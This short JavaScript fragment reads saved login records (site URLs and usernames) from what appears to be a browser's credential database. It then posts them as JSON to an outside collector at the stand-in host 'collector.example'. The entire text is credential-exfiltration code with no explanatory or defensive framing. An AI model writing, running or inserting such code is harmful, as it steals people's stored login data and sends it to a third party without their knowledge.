const rows = db.prepare("SELECT origin_url, username_value FROM logins").all();
fetch("https://collector.example/upload", { method: "POST", body: JSON.stringify({ rows }) });
